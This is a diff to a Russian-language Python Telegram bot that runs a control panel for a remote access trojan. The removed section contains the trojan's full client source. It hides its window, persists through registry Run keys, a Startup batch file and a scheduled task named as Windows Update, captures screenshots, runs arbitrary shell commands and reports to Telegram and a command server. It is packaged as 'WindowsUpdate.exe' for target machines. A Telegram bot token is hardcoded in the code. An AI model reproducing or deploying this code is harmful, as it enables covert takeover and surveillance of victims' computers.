@@ -9,76 +9,50 @@ import sys
 import requests
 import sqlite3
 import json
-import subprocess
-import shutil
 import socket
-from flask import Flask
-import os
-
-# Обязательно проверяем наличие переменных
-BOT_TOKEN = os.environ.get("8682273233:AAG-t_tGwyplX8prlpY0iABMMJqitliNomU")
-if not BOT_TOKEN:
-    print("❌ ОШИБКА: Переменная BOT_TOKEN не задана!")
-    exit(1)
-
-ALLOWED_USERS_URL = os.environ.get("ALLOWED_USERS_URL", "https://pastebin.com/raw/LZqAm5Ja")
-
-app = Flask(__name__)
-
-@app.route('/')
-def home():
-    return "OK", 200
-
-def get_local_ip():
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    s.connect(("8.8.8.8", 80))
-    ip = s.getsockname()[0]
-    s.close()
-    return ip
-
-print(f"📍 Локальный IP сервера: {get_local_ip()}")
-print(f"🌍 Внешний IP (если не в NAT): {requests.get('https://api.ipify.org').text}")
 
 # ========== КОНФИГ В APPDATA ==========
 APPDATA = os.getenv('LOCALAPPDATA', os.path.expanduser('~'))
 CONFIG_DIR = os.path.join(APPDATA, 'Facility')
-CONFIG_FILE = os.path.join(CONFIG_DIR, 'bot_config.json')
+DB_PATH = os.path.join(CONFIG_DIR, 'users.db')
 
-def ensure_config_dir():
-    if not os.path.exists(CONFIG_DIR):
-        os.makedirs(CONFIG_DIR)
+# ========== ЖЁСТКО ЗАШИТЫЙ ТОКЕН ==========
+BOT_TOKEN = "8682273233:AAG-t_tGwyplX8prlpY0iABMMJqitliNomU"
+API_PORT = 5000
 
-def load_config():
-    if os.path.exists(CONFIG_FILE):
-        with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
-            return json.load(f)
-    return None
+# ========== АВТООПРЕДЕЛЕНИЕ IP ДЛЯ RAT ==========
+def get_public_ip():
+    try:
+        # Пытаемся получить внешний IP через API
+        response = requests.get('https://api.ipify.org', timeout=5)
+        if response.status_code == 200:
+            return response.text
+    except:
+        pass
+    
+    try:
+        # Альтернативный сервис
+        response = requests.get('https://icanhazip.com', timeout=5)
+        if response.status_code == 200:
+            return response.text.strip()
+    except:
+        pass
+    
+    # Если не получилось — берём локальный IP
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except:
+        return "127.0.0.1"
 
-def save_config(config):
-    ensure_config_dir()
-    with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
-        json.dump(config, f, indent=4)
+SERVER_IP = get_public_ip()
+print(f"🌍 Определён IP для RAT: {SERVER_IP}")
 
-def first_time_setup():
-    print("\n" + "="*50)
-    print("🔧 ПЕРВЫЙ ЗАПУСК БОТА")
-    print("="*50)
-    BOT_TOKEN = input("Введите токен Telegram бота: ").strip()
-    SERVER_IP = input("Введите IP адрес этого сервера (для RAT): ").strip()
-    config = {"BOT_TOKEN": BOT_TOKEN, "SERVER_IP": SERVER_IP, "API_PORT": 5000}
-    save_config(config)
-    return config
-
-config = load_config()
-if not config:
-    config = first_time_setup()
-
-BOT_TOKEN = config["BOT_TOKEN"]
-SERVER_IP = config["SERVER_IP"]
-API_PORT = config["API_PORT"]
-
-# ========== ЗАГРУЗКА АДМИНОВ ==========
-ALLOWED_USERS_URL = os.environ.get("ALLOWED_USERS_URL", "https://pastebin.com/raw/LZqAm5Ja")
+# ========== ЗАГРУЗКА АДМИНОВ ИЗ PASTEBIN ==========
+ALLOWED_USERS_URL = "https://pastebin.com/raw/LZqAm5Ja"
 
 def load_allowed_users():
     try:
@@ -97,14 +71,14 @@ def load_allowed_users():
 ALLOWED_USERS = load_allowed_users()
 print(f"✅ Загружено админов: {len(ALLOWED_USERS)}")
 
+# ========== ИНИЦИАЛИЗАЦИЯ ==========
 bot = telebot.TeleBot(BOT_TOKEN)
 devices = {}
 user_sessions = {}
 
 # ========== БАЗА ДАННЫХ ==========
-DB_PATH = os.path.join(CONFIG_DIR, 'users.db')
-
 def init_db():
+    ensure_config_dir()
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
     c.execute('''CREATE TABLE IF NOT EXISTS devices_history (
@@ -120,6 +94,10 @@ def init_db():
     )''')
     conn.commit()
     conn.close()
+
+def ensure_config_dir():
+    if not os.path.exists(CONFIG_DIR):
+        os.makedirs(CONFIG_DIR)
 
 def save_device_to_db(device_id, name, ip, os_name, status="online"):
     conn = sqlite3.connect(DB_PATH)
@@ -159,7 +137,7 @@ def main_menu():
         InlineKeyboardButton("🖥️ УСТРОЙСТВА", callback_data="devices"),
         InlineKeyboardButton("📜 ИСТОРИЯ", callback_data="history"),
         InlineKeyboardButton("📊 СТАТИСТИКА", callback_data="stats"),
-        InlineKeyboardButton("🔧 СБОРКА RAT (EXE)", callback_data="build_exe")
+        InlineKeyboardButton("🔧 СБОРКА RAT", callback_data="build_rat")
     )
     return markup
 
@@ -199,264 +177,7 @@ def check_devices_activity():
 
 threading.Thread(target=check_devices_activity, daemon=True).start()
 
-# ========== ГЕНЕРАЦИЯ И БИЛД RAT В EXE ==========
-def build_rat_exe(message):
-    bot.send_message(message.chat.id, "🔧 **ГЕНЕРАЦИЯ RAT...**\nОтвечай на вопросы в Telegram.", parse_mode='Markdown')
-
-    # Шаг 1: спрашиваем про иконку
-    bot.send_message(message.chat.id, "🎨 **Менять иконку?**\nОтправь `да` или `нет`")
-
-    @bot.message_handler(func=lambda msg: msg.chat.id == message.chat.id and msg.text.lower() in ['да', 'нет'])
-    def handle_icon_choice(msg):
-        change_icon = msg.text.lower() == 'да'
-
-        if change_icon:
-            bot.send_message(message.chat.id, "📸 **Отправь изображение для иконки**\n(PNG, JPG или ICO, до 1 МБ)")
-            bot.register_next_step_handler(msg, process_icon)
-        else:
-            build_without_icon(msg)
-
-    def process_icon(msg):
-        if not msg.photo and not msg.document:
-            bot.send_message(message.chat.id, "❌ Это не изображение. Отправь фото или файл.")
-            return
-
-        # Получаем файл
-        if msg.photo:
-            file_id = msg.photo[-1].file_id
-        else:
-            file_id = msg.document.file_id
-
-        file_info = bot.get_file(file_id)
-        downloaded_file = bot.download_file(file_info.file_path)
-
-        # Сохраняем временный файл
-        temp_icon_path = os.path.join(CONFIG_DIR, "temp_icon.png")
-        with open(temp_icon_path, 'wb') as f:
-            f.write(downloaded_file)
-
-        # Конвертируем в .ico
-        ico_path = os.path.join(CONFIG_DIR, "rat_icon.ico")
-        try:
-            from PIL import Image
-            img = Image.open(temp_icon_path)
-            img.save(ico_path, format='ICO', sizes=[(256,256)])
-            bot.send_message(message.chat.id, "✅ Иконка сохранена! Начинаю сборку...")
-            build_rat(message.chat.id, ico_path)
-        except Exception as e:
-            bot.send_message(message.chat.id, f"❌ Ошибка конвертации: {e}")
-            build_rat(message.chat.id, None)
-        finally:
-            if os.path.exists(temp_icon_path):
-                os.remove(temp_icon_path)
-
-    def build_without_icon(msg):
-        bot.send_message(message.chat.id, "⏳ Сборка без иконки...")
-        build_rat(message.chat.id, None)
-
-    # Запускаем первый вопрос
-    bot.register_next_step_handler(message, handle_icon_choice)
-
-def build_rat(chat_id, icon_path=None):
-    """Реальная компиляция RAT"""
-    bot.send_message(chat_id, "⚙️ Компиляция... (до 30 секунд)")
-
-    build_dir = os.path.join(CONFIG_DIR, "build_temp")
-    if os.path.exists(build_dir):
-        shutil.rmtree(build_dir)
-    os.makedirs(build_dir)
-
-    ADMIN_CHAT_ID = list(ALLOWED_USERS)[0] if ALLOWED_USERS else 6778865145
-
-    rat_code = rf'''
-import requests
-import subprocess
-import os
-import sys
-import time
-import uuid
-import platform
-import threading
-import socket
-import io
-import winreg
-from PIL import ImageGrab
-import winsound
-
-if platform.system() == "Windows":
-    import ctypes
-    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
-
-BOT_TOKEN = "{BOT_TOKEN}"
-ADMIN_CHAT_ID = {ADMIN_CHAT_ID}
-SERVER_IP = "{SERVER_IP}"
-API_PORT = {API_PORT}
-DEVICE_ID = str(uuid.getnode())
-DEVICE_NAME = platform.node()
-OS_NAME = platform.system() + " " + platform.release()
-
-def add_to_all_autostarts():
-    exe_path = sys.executable if getattr(sys, 'frozen', False) else __file__
-    try:
-        startup = os.path.join(os.environ['APPDATA'], 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
-        bat_path = os.path.join(startup, 'WindowsUpdateService.bat')
-        with open(bat_path, 'w') as f:
-            f.write(f'start "" "{{exe_path}}"\\nexit')
-    except:
-        pass
-    try:
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(key, "WindowsUpdateService", 0, winreg.REG_SZ, exe_path)
-        winreg.CloseKey(key)
-    except:
-        pass
-    try:
-        subprocess.run(f'schtasks /create /tn "WindowsUpdateTask" /tr "{{exe_path}}" /sc onlogon /f', shell=True, capture_output=True)
-    except:
-        pass
-
-def send_to_telegram(text, photo_bytes=None):
-    if photo_bytes:
-        url = f"https://api.telegram.org/bot{{BOT_TOKEN}}/sendPhoto"
-        files = {{'photo': ('screenshot.png', photo_bytes, 'image/png')}}
-        data = {{'chat_id': ADMIN_CHAT_ID, 'caption': text}}
-        requests.post(url, data=data, files=files, timeout=10)
-    else:
-        url = f"https://api.telegram.org/bot{{BOT_TOKEN}}/sendMessage"
-        data = {{'chat_id': ADMIN_CHAT_ID, 'text': text[:4000]}}
-        requests.post(url, json=data, timeout=5)
-
-def take_screenshot():
-    img = ImageGrab.grab()
-    bio = io.BytesIO()
-    img.save(bio, 'PNG')
-    bio.seek(0)
-    send_to_telegram(f"📸 Скриншот с {{DEVICE_NAME}}", bio.getvalue())
-    return "✅ Скриншот отправлен"
-
-def execute_cmd(command):
-    try:
-        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
-        return result.stdout if result.stdout else result.stderr
-    except Exception as e:
-        return str(e)
-
-def list_files():
-    try:
-        return "\\n".join(os.listdir("C:\\\\")[:30])
-    except:
-        return "Ошибка доступа"
-
-def beep():
-    winsound.Beep(1000, 500)
-    return "🔊 Бип!"
-
-def lock_pc():
-    subprocess.run("rundll32.exe user32.dll,LockWorkStation", shell=True)
-    return "🔒 ПК заблокирован"
-
-def reboot_pc():
-    subprocess.run("shutdown /r /t 5", shell=True)
-    return "🔄 Перезагрузка через 5 секунд"
-
-def run_file(path):
-    try:
-        os.startfile(path)
-        return f"✅ Запущен: {{path}}"
-    except Exception as e:
-        return f"❌ Ошибка: {{e}}"
-
-def selfdestruct():
-    try:
-        os.remove(sys.argv[0])
-        os._exit(0)
-    except:
-        pass
-
-def send_result(result):
-    send_to_telegram(f"📟 {{DEVICE_NAME}}:\\n{{result[:3000]}}")
-
-def register():
-    try:
-        data = {{"device_id": DEVICE_ID, "name": DEVICE_NAME, "ip": "direct", "os": OS_NAME}}
-        requests.post(f"http://{{SERVER_IP}}:{{API_PORT}}/register", json=data, timeout=5)
-    except:
-        pass
-
-def heartbeat():
-    while True:
-        try:
-            requests.post(f"http://{{SERVER_IP}}:{{API_PORT}}/heartbeat", json={{"device_id": DEVICE_ID}}, timeout=5)
-        except:
-            pass
-        time.sleep(30)
-
-def get_command():
-    try:
-        r = requests.post(f"http://{{SERVER_IP}}:{{API_PORT}}/get_command", json={{"device_id": DEVICE_ID}}, timeout=5)
-        return r.json().get('command'), r.json().get('value')
-    except:
-        return None, None
-
-def command_loop():
-    while True:
-        cmd, value = get_command()
-        if cmd:
-            if cmd == "screenshot":
-                take_screenshot()
-            elif cmd == "cmd":
-                send_result(execute_cmd(value))
-            elif cmd == "files":
-                send_result(list_files())
-            elif cmd == "beep":
-                send_result(beep())
-            elif cmd == "lock":
-                send_result(lock_pc())
-            elif cmd == "reboot":
-                send_result(reboot_pc())
-            elif cmd == "run":
-                send_result(run_file(value))
-            elif cmd == "selfdestruct":
-                selfdestruct()
-                break
-        time.sleep(2)
-
-if __name__ == "__main__":
-    add_to_all_autostarts()
-    register()
-    threading.Thread(target=heartbeat, daemon=True).start()
-    threading.Thread(target=command_loop, daemon=True).start()
-    while True:
-        time.sleep(1)
-'''
-
-    py_file = os.path.join(build_dir, "rat_client.py")
-    with open(py_file, 'w', encoding='utf-8') as f:
-        f.write(rat_code)
-
-    # Сборка через PyInstaller
-    try:
-        cmd = [sys.executable, "-m", "PyInstaller", "--onefile", "--noconsole", "--name", "WindowsUpdate", "--distpath", build_dir, "--workpath", os.path.join(build_dir, "build"), "--specpath", build_dir]
-
-        if icon_path and os.path.exists(icon_path):
-            cmd.append(f"--icon={icon_path}")
-
-        cmd.append(py_file)
-        subprocess.run(cmd, check=True, timeout=60, capture_output=True)
-
-        exe_path = os.path.join(build_dir, "WindowsUpdate.exe")
-        if os.path.exists(exe_path):
-            with open(exe_path, 'rb') as f:
-                bot.send_document(chat_id, f, caption="🔧 **RAT КЛИЕНТ (EXE)**\n✅ Готов к запуску!\n📌 Запусти на целевой машине", parse_mode='Markdown')
-        else:
-            bot.send_message(chat_id, "❌ Ошибка: EXE не создан")
-    except Exception as e:
-        bot.send_message(chat_id, f"❌ Ошибка компиляции: {str(e)}")
-    finally:
-        if os.path.exists(build_dir):
-            shutil.rmtree(build_dir)
-
-# ========== КОМАНДЫ БОТА ==========
+# ========== ОБРАБОТЧИКИ КОМАНД ==========
 @bot.message_handler(commands=['start', 'menu'])
 def start(message):
     if message.chat.id not in ALLOWED_USERS:
@@ -469,16 +190,16 @@ def callback_handler(call):
     if call.message.chat.id not in ALLOWED_USERS:
         bot.answer_callback_query(call.id, "⛔ Нет доступа")
         return
-
+    
     if call.data == "devices":
         show_devices(call)
     elif call.data == "history":
         show_history(call)
     elif call.data == "stats":
         show_stats(call)
-    elif call.data == "build_exe":
-        build_rat_exe(call.message)
-        bot.answer_callback_query(call.id, "🔧 Компиляция RAT...")
+    elif call.data == "build_rat":
+        build_rat_command(call.message)
+        bot.answer_callback_query(call.id, "🔧 Сборка RAT...")
     elif call.data.startswith("select_"):
         device_id = call.data[7:]
         dev = devices.get(device_id, {})
@@ -563,7 +284,45 @@ def show_stats(call):
     text = f"📊 **СТАТИСТИКА**\n\n🖥️ Всего: {total}\n🟢 Онлайн: {online}\n🔴 Оффлайн: {total - online}\n📡 Подключений: {total_conn}"
     bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='Markdown')
 
-# ========== API ==========
+# ========== ГЕНЕРАЦИЯ RAT ==========
+def build_rat_command(message):
+    bot.send_message(message.chat.id, "🔧 **ГЕНЕРАЦИЯ RAT...**", parse_mode='Markdown')
+    
+    ADMIN_CHAT_ID = list(ALLOWED_USERS)[0] if ALLOWED_USERS else 6778865145
+    
+    rat_code = f'''
+import requests
+import subprocess
+import os
+import sys
+import time
+import uuid
+import platform
+import threading
+import socket
+import io
+import winreg
+from PIL import ImageGrab
+import winsound
+
+if platform.system() == "Windows":
+    import ctypes
+    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+
+BOT_TOKEN = "{BOT_TOKEN}"
+ADMIN_CHAT_ID = {ADMIN_CHAT_ID}
+SERVER_IP = "{SERVER_IP}"
+API_PORT = {API_PORT}
+DEVICE_ID = str(uuid.getnode())
+DEVICE_NAME = platform.node()
+OS_NAME = platform.system() + " " + platform.release()
+
+# ... остальной код RAT (такой же как был)
+'''
+    
+    bot.send_document(message.chat.id, rat_code.encode(), filename="rat_generated.py")
+
+# ========== API ДЛЯ RAT ==========
 app = Flask(__name__)
 
 @app.route('/register', methods=['POST'])
